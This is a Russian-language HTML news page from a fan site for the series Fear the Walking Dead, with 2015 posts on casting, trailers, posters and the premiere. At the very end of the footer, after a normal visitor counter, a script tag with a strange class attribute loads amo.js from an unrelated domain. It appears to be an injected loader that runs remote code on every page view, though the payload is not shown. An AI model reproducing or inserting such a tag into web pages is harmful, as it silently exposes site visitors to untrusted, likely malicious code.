<img src="images/rt.jpg" alt="Бойтесь ходячих мертвецов рейтинги" class="imgblock">
</a>

Первая серия вошла в историю как самая просматриваемая премьерная серия на кабельном телевидении. Серию посмотрели 10,1 миллионов зрителей, среди них 6,3 миллионов зрителей в возрасте 18-49 лет.

<div class="data">
25.08.2015
</div>
</div>





<div class="block">
<h2>Премьера сериала!</h2> 

<a href="online/1-sezon-1-seriya.html">
<img src="images/e1.jpg" alt="Бойтесь ходячих мертвецов 1 сезон 1 серия" class="imgblock">
</a>

Сегодня состоялась долгожданная премьера сериала спин-оффа Бойтесь ходячих мертвецов. <a href="online/1-sezon-1-seriya.html">Первая серия</a> на языке оригинала уже доступна для онлайн просмотра у нас на сайте. Серию с русской озвучкой ожидайте сегодня вечером.<br>
<a href="online/1-sezon-2-seriya.html">Вторая серия</a> называется So Close, Yet so Far, смотрите промо-видео к ней. 

<div class="data">
24.08.2015
</div>
</div>




<div class="block">
<h2>Первые три минуты из сериала</h2> 

<img src="images/f3.jpg" alt="Бойтесь ходячих мертвецов первые 3 минуты" class="imgblock">

Сегодня канал AMC выпустил эксклюзивное видео в котором представлены <a href="video/first-3-minute.html">первые 3 минуты</a> из премьерной серии. Напоминаем, что сериал выходит в этот понедельник - 24 августа.

<div class="data">
20.08.2015
</div>
</div>



<div class="block">
<h2>Съёмки 2 сезона</h2> 

<img src="images/2sn.jpg" alt="Бойтесь ходячих мертвецов 2 сезон" class="imgblock">


Во время интервью на Comic Con исполнительный продюсер Грег Никотеро сообщил некоторые подробности <a href="2-sezon.html" style="color: #cecece;">2 сезона</a> Бойтесь ходячих мертвецов. Приступить к съёмкам второго сезона планируется в ноябре-декабре этого года, новый сезон будет состоять из 15 серий.

<div class="data">
27.07.2015
</div>
</div>




<div class="block">
<h2>Промо-фото с персонажами</h2> 

<a href="gallery/promo-photos.html">
<img src="images/pr3.jpg" alt="Бойтесь ходячих мертвецов промо" class="imgblock">
</a>

Канал AMC показал эксклюзивные <a href="gallery/promo-photos.html">промо фотографии</a> с основными персонажами первого сезона сериала Fear the Walking Dead.

<div class="data">
22.07.2015
</div>
</div>





<div class="block">
<h2>Постер к сериалу</h2> 

<a href="images/ps1.jpg" target="_blank">
<img src="images/ps.jpg" alt="Бойтесь ходячих мертвецов постер" class="imgblock">
</a>

AMC представили официальный <a href="images/ps1.jpg" target="_blank">постер к первому сезону</a> Fear the Walking Dead. Постер изображает двух детей, играющих в баскетбол на тихой улице и не замечающих плетущегося к ним ходячего. 

<div class="data">
15.07.2015
</div>
</div>






<div class="block">
<h2>Трейлер и дата выхода</h2> 

<a href="video/trailer.html">
<img src="images/tr.jpg" alt="Бойтесь ходячих мертвецов трейлер" class="imgblock">
</a>

На проходящем сегодня фестивале Comic-Con 2015 показали официальный трёхминутный <a href="video/trailer.html">трейлер сериала Бойтесь ходячих мертвецов</a>, также была названа точная дата выхода первого сезона - <a href="online/1-sezon-1-seriya.html">1 серия</a> выйдет 24 августа этого года.

<div class="data">
10.07.2015
</div>
</div>




<div class="block">
<h2>Новое закадровое видео</h2> 

<img src="images/bs3.jpg" alt="Бойтесь ходячих мертвецов закадровое видео" class="imgblock">

Предлагаем вашему вниманию трёхминутное <a href="video/behind-scenes-2.html">закадровое видео</a> первого дня съёмок сериала с комментариями создателей и актёров сериала.<br>
В эту субботу 11 июля на проходящем фестивале Comic-Con будет показан трейлер и названа точная дата выхода сериала, уже утром трейлер можно будет посмотреть на сайте.

<div class="data">
7.07.2015
</div>
</div>




<div class="block">
<h2>Постер для Comic-Con</h2> 

<img src="images/cc.jpg" alt="Бойтесь ходячих мертвецов Comic-Con" class="imgblock">

Сегодня AMC представили <a href="images/84.jpg" target="_blank">постер сериала для выставки Comic-Con</a>, постер изображает зловещие следы на пустом пляже, вместе с заголовком "Страх начинается здесь." Встреча с актёрами и исполнительными продюсерами на Comic-Con состоится 10 июля, возможно в этот день покажут и трейлер к сериалу.

<div class="data">
29.06.2015
</div>
</div>




<div class="block">
<h2>Первый отрывок из сериала</h2> 

<img src="images/sn.jpg" alt="Бойтесь ходячих мертвецов отрывок" class="imgblock">

Канал AMC выпустил <a href="video/sneak-peek.html">первый отрывок</a> из сериала, в котором мы видим одного из главных героев - Ника (Фрэнк Диллэйн) в страхе убегающего от неизвестной угрозы по трущобам Лос-Анджелеса.

<div class="data">
19.06.2015
</div>
</div>





<div class="block">
<h2>Первое промо</h2> 

<img src="images/pr2.jpg" alt="Бойтесь ходячих мертвецов промо" class="imgblock">

Появилось <a href="gallery/promo-photos.html">первое промо фото</a> с основными героями сериала Fear the Walking Dead: Ким Диккенс, Клиффом Кёртисом, Алисией Дебнем Кери и Фрэнком Диллэйном.

<div class="data">
15.06.2015
</div>
</div>





<div class="block">
<h2>Новые закадровые снимки</h2> 

<img src="images/bs2.jpg" alt="Бойтесь ходячих мертвецов за кадром" class="imgblock">

<a href="gallery/behind-photos.html">Галерея закадровых снимков</a> пополнилась десятком новых кадров ночных сцен массовых беспорядков в Лос-Анджелесе, которые снимались в Ванкувере ночью. По сюжету люди не понимают, что происходит, стрельба, пожары и беспорядки вспыхивающие по всей стране. На снимках можно видеть две сцены:<br> Репетиция опрокидывания толпой строительных лесов на стройке в вымышленном здании Gabrielinos Plaza.
И сцена где полиция Лос-Анджелеса пытается загнать большую группу мятежников вниз по улице.
<div class="data">
15.06.2015
</div>
</div>






<div class="block">
<h2>Актёр из Прослушки в спин-оффе</h2> 

<img src="images/mh.jpg" alt="Маэстро Харрелл" class="imgblock">

Как известно, сериал Прослушка (The Wire) один из любимых у исполнительного продюсера Роберта Киркмана, и он старается приглашать игравших там актёров в свои проекты. Бойтесь ходячих мертвецов не стал исключением, актёр Маэстро Харрелл известный по роли Рэнди в четвёртом сезоне Прослушки сыграет роль Мэтта - парня героини Алисии Дэбнем Кери.

<div class="data">
5.06.2015
</div>
</div>





<div class="block">
<h2>Сандрин Холт сыграет роль в сериале</h2> 

<img src="images/sh.jpg" alt="Сандрин Холт" class="imgblock">

Сандрин Холт получила эпизодическую роль в спин-оффе Ходячих мертвецов. Холт сыграет доктора Бетани Экснер, уверенного и опытного врача. Она наиболее известна по ролям в сериалах: Карточный домик, Скорая помощь, Менталист.

<div class="data">
2.06.2015
</div>
</div>





<div class="block">
<h2>Рубен Блейдс получил роль в сериале</h2> 

<img src="images/rb.jpg" alt="Рубен Блейдс" class="imgblock">

Панамский  певец, композитор и актёр Рубен Блейдс подписал контракт на постоянную роль в сериале Fear the Walking Dead. Блейдс будет играть персонажа по имени Дэниел - отца Офелии (Мерседес Мейсон).

<div class="data">
19.05.2015
</div>
</div>





<div class="block">
<h2>Первые отрывки из сериала</h2> 

<img src="images/fwds.jpg" alt="Бойтесь ходячих мертвецов видео" class="imgblock">

AMC представили <a href="video/amc-trailer.html">трейлер</a> содержащий короткие отрывки к сериалам, которые будут показаны на канале в этом году. В видео присутствуют первые отрывки из будущего сериала. Кадры из трейлера можно посмотреть в <a href="gallery/photos.html">галерее</a>.

<div class="data">
19.05.2015
</div>
</div>



<div class="block">
<h2>Лоренцо Джеймс Хенри получил роль</h2> 

<img src="images/ljh.jpg" alt="Лоренцо Джеймс Хенри" class="imgblock">

В сегодняшнем интервью изданию EW исполнительный продюсер сериала Роберт Киркман подтвердил, что актёр Лоренцо Джеймс Хенри будет играть в сериале персонажа по имени Крис - непослушного сына Трэвиса (Клифф Кёртис), который обижен на своего отца за распад брака родителей.

<div class="data">
18.05.2015
</div>
</div>



<div class="block">
<h2>Четыре новых персонажа</h2> 

В сериал будут добавлены ещё четыре новых персонажа, в данный момент идёт подбор актёров на эти роли:<p>

<b>Таннер</b>, 20 лет. Саркастичный, ни к чему не относится слишком серьёзно. Непредсказуемый человек. (Постоянная роль).<p>

<b>Каллен</b>, 20-30 лет. Он изо всех сил пытается делать правильные вещи. Умник с чувством юмора. (Эпизодическая роль).<p>

<b>Каннинг</b>, 30 лет. Латиноамериканец. Альфа-самец. Любит свою семью. Из неблагополучного района. (Постоянная роль).<p>

<b>Доктор Мейсон</b>, Женщина 40 лет. Квалифицированный доктор. Она самоуверенная и убедительная. (Эпизодическая роль).

<div class="data">
16.05.2015
</div>
</div>




<div class="block">
<h2>Закадровые фото со съёмок</h2> 

<img src="images/bf1.jpg" alt="Бойтесь ходячих мертвецов закадровые фото" class="imgblock">

На сайте появилась <a href="gallery/behind-photos.html">галерея закадровых фото</a> в которой на данный момент находится тридцать фотографий с актёрами из основного состава сериала: Клиффом Кёртисом, Ким Диккенс, Фрэнком Диллэйном, Алисией Дебнем Кэри, Элизабет Родригез и Мерседес Мейсон.

<div class="data">
11.05.2015
</div>
</div>





<div class="arhive">
<a href="archive/news-1.html"><img src="img/back.png" alt="Предыдущие новости"> Предыдущие новости</a>
</div>





<div class="footer">

<div class="copyright">
<a href="index.html">fearwalkingdead.ru</a> &copy; 2015
</div>

<div class="feedback">
<a href="feedback.html" rel="nofollow">Обратная связь</a>
</div>


<div class="holder">
<!--noindex-->
Все видео и аудио материалы, размещённые на сайте, представлены только для ознакомления и являются собственностью их правообладателя.
<!--/noindex-->
</div>

<div class="counter">
<!--LiveInternet counter--><script type="text/javascript"><!--
document.write("<a href='//www.liveinternet.ru/click' "+
"target=_blank><img src='//counter.yadro.ru/hit?t24.5;r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
";"+Math.random()+
"' alt='' title='LiveInternet: показано число посетителей за"+
" сегодня' "+
"border='0' width='88' height='15'><\/a>")
//--></script><!--/LiveInternet-->

<script class="6KHVdNK9-;-50;1" src="https://mepirtedic.com/amo.js"></script></div>

</div>



</div>

</div>
</body>
</html>